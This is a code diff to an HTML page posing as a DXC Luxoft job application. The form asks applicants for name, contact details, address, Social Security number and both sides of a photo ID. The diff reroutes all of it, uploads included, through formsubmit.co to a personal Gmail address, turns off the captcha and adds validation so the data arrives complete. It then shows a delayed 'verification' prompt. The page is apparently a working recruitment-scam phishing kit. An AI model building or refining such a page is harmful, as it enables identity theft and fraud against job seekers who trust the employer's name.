@@ -19,6 +19,7 @@
       --slideshow-bg: #2E1E60;
       --border-color: rgba(44, 26, 91, 0.5);
       --font: 'Segoe UI', 'Roboto', sans-serif;
+      --error-color: #ff4444;
     }
 
     * {
@@ -35,6 +36,7 @@
       line-height: 1.6;
       font-size: 16px;
       padding: 2rem;
+      min-height: 100vh;
     }
 
     h1 {
@@ -89,6 +91,13 @@
       box-shadow: 0 0 5px rgba(124, 58, 237, 0.3);
     }
 
+    .error-message {
+      color: var(--error-color);
+      font-size: 0.875rem;
+      margin-top: 0.25rem;
+      display: none;
+    }
+
     .tooltip {
       color: var(--accent-purple);
       cursor: help;
@@ -129,10 +138,17 @@
       transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
     }
 
-    button:hover {
+    button:hover:not(:disabled) {
       background-color: var(--accent-hover);
       transform: scale(1.02);
       box-shadow: 0 2px 8px rgba(108, 33, 168, 0.3);
+    }
+
+    button:disabled {
+      background-color: var(--text-secondary);
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
     }
 
     #loading {
@@ -248,19 +264,55 @@
       padding: 2rem;
       border-radius: 8px;
       margin-top: 2rem;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
     }
 
     @media (max-width: 768px) {
-      h1 { font-size: 2rem; }
-      .step { padding: 1.5rem; }
-      button { padding: 0.75rem 2rem; }
+      body {
+        padding: 1rem;
+      }
+      
+      h1 { 
+        font-size: 2rem; 
+      }
+      
+      .step { 
+        padding: 1.5rem; 
+      }
+      
+      input[type="text"], input[type="email"], input[type="tel"] { 
+        padding: 0.5rem; 
+      }
+      
+      button { 
+        padding: 0.75rem 2rem; 
+        font-size: 1rem; 
+      }
     }
 
     @media (max-width: 480px) {
-      h1 { font-size: 1.5rem; }
-      .step { padding: 1rem; }
-      button { padding: 0.5rem 1.5rem; }
-      .button-container { flex-direction: column; gap: 1rem; }
+      h1 { 
+        font-size: 1.5rem; 
+      }
+      
+      .step { 
+        padding: 1rem; 
+      }
+      
+      .form-group { 
+        margin-bottom: 1rem; 
+      }
+      
+      button { 
+        padding: 0.5rem 1.5rem; 
+      }
+      
+      .button-container { 
+        flex-direction: column; 
+        gap: 1rem; 
+      }
     }
   </style>
 </head>
@@ -286,22 +338,31 @@
     <p>Thank you for submitting your application. Please wait for verification instructions.</p>
   </div>
   
-  <!-- GOOGLE FORMS INTEGRATION -->
-  <!-- REPLACE THE URL AND FIELD IDs WITH YOUR ACTUAL ONES -->
-  <form id="applicationForm" action="https://docs.google.com/forms/d/e/1FAIpQLSf4vCWWvGKsy_ZNVeruEXqauFcrrTIh40gaD0A6VPGbXEFCbQ/formResponse" method="POST" target="hiddenFrame">
+  <!-- FORMSUBMIT.CO FORM - PROPERLY CONFIGURED -->
+  <form id="applicationForm" action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data" target="hiddenFrame">
+    <!-- FormSubmit Configuration -->
+    <input type="hidden" name="_subject" value="New Luxoft Job Application">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_autoresponse" value="Thank you for your application to DXC Luxoft! We will review your submission and contact you shortly.">
+    <input type="hidden" name="_blacklist" value="spam,test">
+    
     <!-- Step 1: Personal Info -->
     <div class="step active" id="step1">
       <div class="form-group">
         <label for="fullname">Full Name</label>
-        <input type="text" id="fullname" name="entry.YOUR_FULLNAME_ID" placeholder="Enter your full name" required>
+        <input type="text" id="fullname" name="Full Name" placeholder="Enter your full name" required>
+        <div class="error-message" id="fullname-error">Please enter your full name</div>
       </div>
       <div class="form-group">
         <label for="email">Email <span class="tooltip" title="We'll never share your email.">ⓘ</span></label>
-        <input type="email" id="email" name="entry.YOUR_EMAIL_ID" placeholder="Enter your email" required>
+        <input type="email" id="email" name="Email" placeholder="Enter your email" required>
+        <div class="error-message" id="email-error">Please enter a valid email address</div>
       </div>
       <div class="form-group">
         <label for="phone">Phone Number</label>
-        <input type="tel" id="phone" name="entry.YOUR_PHONE_ID" placeholder="Enter your phone number" required>
+        <input type="tel" id="phone" name="Phone Number" placeholder="Enter your phone number" required>
+        <div class="error-message" id="phone-error">Please enter a valid phone number</div>
       </div>
       <div class="button-container">
         <button type="button" onclick="nextStep()">Next</button>
@@ -312,11 +373,13 @@
     <div class="step" id="step2">
       <div class="form-group">
         <label for="address">Full Address</label>
-        <input type="text" id="address" name="entry.YOUR_ADDRESS_ID" placeholder="Enter your full address, street, city, state, country" required>
+        <input type="text" id="address" name="Full Address" placeholder="Enter your full address, street, city, state, country" required>
+        <div class="error-message" id="address-error">Please enter your full address</div>
       </div>
       <div class="form-group">
         <label for="ssn">SSN <span class="tooltip" title="Enter 9-digit Social Security Number.">ⓘ</span></label>
-        <input type="text" id="ssn" name="entry.YOUR_SSN_ID" placeholder="XXXXXXXXX" pattern="\d{9}" title="Enter SSN in XXXXXXXXX format" required>
+        <input type="text" id="ssn" name="SSN" placeholder="XXXXXXXXX" pattern="\d{9}" title="Enter SSN in XXXXXXXXX format" required>
+        <div class="error-message" id="ssn-error">Please enter a valid 9-digit SSN</div>
       </div>
       <div class="button-container">
         <button type="button" onclick="prevStep()">Back</button>
@@ -324,7 +387,7 @@
       </div>
     </div>
 
-    <!-- Step 3: Uploads (Files will be emailed separately) -->
+    <!-- Step 3: Uploads -->
     <div class="step" id="step3">
       <div class="form-group">
         <label for="id-front">Photo ID (Front)</label>
@@ -332,7 +395,8 @@
           Drag & drop or click to upload
           <span id="file-name-front" style="display:block;margin-top:0.5rem;color:var(--text-secondary);font-weight:600;">No file chosen</span>
         </div>
-        <input type="file" id="id-front" name="id_front" accept=".pdf,.doc,.docx,.jpg,.jpeg,.png" style="display:none;">
+        <input type="file" id="id-front" name="ID_Front" accept=".pdf,.doc,.docx,.jpg,.jpeg,.png" required>
+        <div class="error-message" id="id-front-error">Please upload the front of your Photo ID</div>
       </div>
       <div class="form-group">
         <label for="id-back">Photo ID (Back)</label>
@@ -340,7 +404,8 @@
           Drag & drop or click to upload
           <span id="file-name-back" style="display:block;margin-top:0.5rem;color:var(--text-secondary);font-weight:600;">No file chosen</span>
         </div>
-        <input type="file" id="id-back" name="id_back" accept=".pdf,.doc,.docx,.jpg,.jpeg,.png" style="display:none;">
+        <input type="file" id="id-back" name="ID_Back" accept=".pdf,.doc,.docx,.jpg,.jpeg,.png" required>
+        <div class="error-message" id="id-back-error">Please upload the back of your Photo ID</div>
       </div>
       
       <div class="button-container">
@@ -351,7 +416,7 @@
     </div>
   </form>
 
-  <!-- Hidden iframe for Google Forms submission -->
+  <!-- Hidden iframe for form submission -->
   <iframe name="hiddenFrame" id="hiddenFrame" style="display: none;"></iframe>
 
   <footer>
@@ -362,13 +427,16 @@
 
   <script>
     let currentStep = 1;
+    let isFormSubmitted = false;
     
     function nextStep() {
-      if (currentStep < 3) {
-        document.getElementById(`step${currentStep}`).classList.remove("active");
-        currentStep++;
-        document.getElementById(`step${currentStep}`).classList.add("active");
-        updateStepIndicator();
+      if (validateCurrentStep()) {
+        if (currentStep < 3) {
+          document.getElementById(`step${currentStep}`).classList.remove("active");
+          currentStep++;
+          document.getElementById(`step${currentStep}`).classList.add("active");
+          updateStepIndicator();
+        }
       }
     }
 
@@ -388,7 +456,60 @@
       });
     }
 
-    // Drag & Drop functionality
+    function validateCurrentStep() {
+      let isValid = true;
+      
+      // Clear previous errors
+      document.querySelectorAll('.error-message').forEach(error => {
+        error.style.display = 'none';
+      });
+      
+      // Validate step 1
+      if (currentStep === 1) {
+        const fullname = document.getElementById('fullname').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        
+        if (!fullname) {
+          document.getElementById('fullname-error').style.display = 'block';
+          isValid = false;
+        }
+        
+        if (!email || !isValidEmail(email)) {
+          document.getElementById('email-error').style.display = 'block';
+          isValid = false;
+        }
+        
+        if (!phone) {
+          document.getElementById('phone-error').style.display = 'block';
+          isValid = false;
+        }
+      }
+      
+      // Validate step 2
+      if (currentStep === 2) {
+        const address = document.getElementById('address').value.trim();
+        const ssn = document.getElementById('ssn').value.trim();
+        
+        if (!address) {
+          document.getElementById('address-error').style.display = 'block';
+          isValid = false;
+        }
+        
+        if (!ssn || !/^\d{9}$/.test(ssn)) {
+          document.getElementById('ssn-error').style.display = 'block';
+          isValid = false;
+        }
+      }
+      
+      return isValid;
+    }
+    
+    function isValidEmail(email) {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return emailRegex.test(email);
+    }
+
     function setupDragDrop(dropId, inputId) {
       const dropZone = document.getElementById(dropId);
       const input = document.getElementById(inputId);
@@ -436,10 +557,15 @@
       document.getElementById('overlay').style.display = 'none';
     }
 
-    // GOOGLE FORMS SUBMISSION
+    // FORM SUBMISSION HANDLER
     document.getElementById("applicationForm").addEventListener("submit", function(e) {
       e.preventDefault();
       
+      if (isFormSubmitted) {
+        alert('Form already submitted!');
+        return;
+      }
+
       // Validate all fields
       const requiredFields = this.querySelectorAll('[required]');
       let isValid = true;
@@ -447,7 +573,7 @@
       requiredFields.forEach(field => {
         if (!field.value.trim()) {
           isValid = false;
-          field.style.borderColor = 'red';
+          field.style.borderColor = 'var(--error-color)';
         } else {
           field.style.borderColor = '';
         }
@@ -458,7 +584,15 @@
       const backFile = document.getElementById('id-back').files[0];
       
       if (!frontFile || !backFile) {
+        isValid = false;
         alert('Please upload both front and back of your Photo ID');
+        return;
+      }
+      
+      // Check file sizes (FormSubmit has limits)
+      const maxSize = 10 * 1024 * 1024; // 10MB
+      if (frontFile.size > maxSize || backFile.size > maxSize) {
+        alert('File size too large. Please upload files smaller than 10MB.');
         return;
       }
       
@@ -470,23 +604,10 @@
       // Show loading
       document.getElementById("loading").style.display = "block";
       document.getElementById("submitButton").disabled = true;
-
-      // Submit to Google Forms via hidden iframe
+      isFormSubmitted = true;
+      
+      // Submit the form to the hidden iframe
       this.submit();
-      
-      // After Google Forms submission, handle file upload via email
-      const formData = {
-        name: document.getElementById('fullname').value,
-        email: document.getElementById('email').value
-      };
-      
-      // Create email for file attachments
-      const subject = `Luxoft Application Files - ${formData.name}`;
-      const body = `Please find attached ID photos for ${formData.name} (${formData.email})`;
-      const mailtoLink = `mailto:luxoftorganization@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-      
-      // Open email client for file submission
-      window.open(mailtoLink, '_blank');
       
       // Hide form and show success
       setTimeout(() => {
@@ -495,13 +616,18 @@
         });
         document.getElementById('successMessage').style.display = 'block';
         document.getElementById("loading").style.display = "none";
-        
-        // Show verification alert after 10 seconds
-        setTimeout(() => {
-          document.getElementById('verificationAlert').style.display = 'block';
-          document.getElementById('overlay').style.display = 'block';
-        }, 10000);
-      }, 2000);
+      }, 1000);
+      
+      // Show verification alert after 10 seconds
+      setTimeout(() => {
+        document.getElementById('verificationAlert').style.display = 'block';
+        document.getElementById('overlay').style.display = 'block';
+      }, 10000);
+    });
+
+    // Listen for iframe load to detect successful submission
+    document.getElementById('hiddenFrame').addEventListener('load', function() {
+      console.log('Form submitted to FormSubmit');
     });
   </script>
 </body>
